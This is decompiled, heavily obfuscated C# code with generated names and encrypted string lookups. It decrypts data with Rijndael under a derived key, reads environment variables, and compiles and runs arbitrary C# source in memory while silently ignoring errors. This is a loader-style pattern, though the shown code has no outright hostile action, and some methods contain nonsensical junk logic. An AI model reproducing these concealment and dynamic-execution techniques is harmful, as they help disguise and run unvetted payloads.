using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using Microsoft.CSharp;
using ns1;

namespace ns0;

internal class Class0
{
	private static Class3 class3_0 = new Class3();

	public string method_0(string string_0)
	{
		string environmentVariable = Environment.GetEnvironmentVariable(string_0);
		Type typeFromHandle = typeof(Class0);
		MethodInfo methodInfo = null;
		MethodInfo[] methods = typeFromHandle.GetMethods();
		foreach (MethodInfo methodInfo2 in methods)
		{
			ParameterInfo[] parameters = methodInfo2.GetParameters();
			if (parameters.Length == 3 && (object)parameters[0].ParameterType == Type.GetType(Class57.smethod_0(1439910966, 509654011, 445949305)))
			{
				_ = methodInfo2.Name;
				methodInfo = methodInfo2;
				break;
			}
		}
		object obj = Activator.CreateInstance(typeFromHandle);
		object[] parameters2 = new object[3]
		{
			1,
			environmentVariable,
			Class57.smethod_0(1257345248, 509654007, 445949295)
		};
		object obj2 = methodInfo.Invoke(obj, parameters2);
		return (string)obj2;
	}

	public string method_1(int int_0)
	{
		if (!(method_0(Class57.smethod_0(1689355051, 509653891, 445949259)).Replace(Class57.smethod_0(2064293681, 509653915, 445949291), Class57.smethod_0(1379334240, 509653915, 445949283)).Replace(Class57.smethod_0(2100368657, 509653907, 445949291), Class57.smethod_0(744661787, 509653907, 445949283)) == Class57.smethod_0(1419502724, 509653929, 445949285)) && !(method_0(Class57.smethod_0(36995999, 509653937, 445949307)).Replace(Class57.smethod_0(1928149340, 509653961, 445949291), Class57.smethod_0(2118304628, 509653961, 445949283)).Replace(Class57.smethod_0(440356635, 509653953, 445949291), Class57.smethod_0(506077655, 509653953, 445949283)) != Class57.smethod_0(125035750, 509653953, 445949283)))
		{
			return Class57.smethod_0(351447223, 509653969, 445949287);
		}
		return Class57.smethod_0(1062529720, 509653981, 445949295);
	}

	public string method_2(double double_0, string string_0, string string_1)
	{
		if (string_0 != null && string_0.ToString() == Class57.smethod_0(475008425, 509653839, 445949295))
		{
			return Class57.smethod_0(339158451, 509653851, 445949295);
		}
		return Class57.smethod_0(534049230, 509653843, 445949291) + string_0 + Class57.smethod_0(1613971526, 509653867, 445949291);
	}

	public string method_3(int int_0, string string_0, string string_1)
	{
		if (string_0 == null && string_0.ToString() == Class57.smethod_0(1763935663, 509653811, 445949307))
		{
			return string_0 + int_0;
		}
		return string_0 + string_1;
	}

	public string method_4(long long_0, string string_0, string string_1)
	{
		if (string_0.ToString() == Class57.smethod_0(2104018111, 509653803, 445949253))
		{
			return string_0 + long_0;
		}
		return string_0 + string_1;
	}

	public static string smethod_0(byte[] byte_0, string string_0, string string_1)
	{
		return Encoding.Unicode.GetString(smethod_1(byte_0, string_0, string_1));
	}

	public static byte[] smethod_1(byte[] byte_0, string string_0, string string_1)
	{
		MemoryStream stream = new MemoryStream(byte_0);
		MemoryStream memoryStream = new MemoryStream();
		Rijndael rijndael = Rijndael.Create();
		PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(string_0, Encoding.ASCII.GetBytes(string_1));
		rijndael.Key = passwordDeriveBytes.GetBytes(32);
		rijndael.IV = passwordDeriveBytes.GetBytes(16);
		ICryptoTransform transform = rijndael.CreateDecryptor();
		CryptoStream stream_ = new CryptoStream(stream, transform, CryptoStreamMode.Read);
		Stream0 stream2 = new Stream0(stream_);
		byte[] array = new byte[2048];
		int num;
		do
		{
			num = stream2.Read(array, 0, array.Length);
			memoryStream.Write(array, 0, num);
		}
		while (num > 0);
		stream2.Close();
		memoryStream.Flush();
		memoryStream.Close();
		return memoryStream.ToArray();
	}

	public static string smethod_2(string string_0)
	{
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		return BitConverter.ToString(mD5CryptoServiceProvider.ComputeHash(smethod_3(string_0))).Replace(Class57.smethod_0(936112698, 509653749, 445949281), Class57.smethod_0(1015107506, 509653749, 445949283));
	}

	private static byte[] smethod_3(string string_0)
	{
		return new ASCIIEncoding().GetBytes(string_0);
	}

	private static string smethod_4(byte[] byte_0)
	{
		return new ASCIIEncoding().GetString(byte_0, 0, byte_0.Length);
	}

	public static object smethod_5(string string_0, string string_1, string string_2, string[] string_3, object[] object_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		try
		{
			CSharpCodeProvider val = new CSharpCodeProvider();
			ICodeCompiler val2 = ((CodeDomProvider)val).CreateCompiler();
			CompilerParameters val3 = new CompilerParameters();
			foreach (string value in string_3)
			{
				val3.get_ReferencedAssemblies().Add(value);
			}
			val3.set_GenerateInMemory(true);
			CompilerResults val4 = val2.CompileAssemblyFromSource(val3, string_0);
			if (!val4.get_Errors().get_HasErrors())
			{
				object obj = val4.get_CompiledAssembly().CreateInstance(string_1);
				if (obj != null)
				{
					return obj.GetType().InvokeMember(string_2, BindingFlags.InvokeMethod, null, obj, object_0);
				}
			}
		}
		catch
		{
		}
		return null;
	}

	public static object smethod_6(string string_0, string string_1, string[] string_2, object[] object_0)
	{
		string string_3 = Class57.smethod_0(1025463502, 509653747, 445949221);
		return smethod_5(string_0, string_3, string_1, string_2, object_0);
	}
}
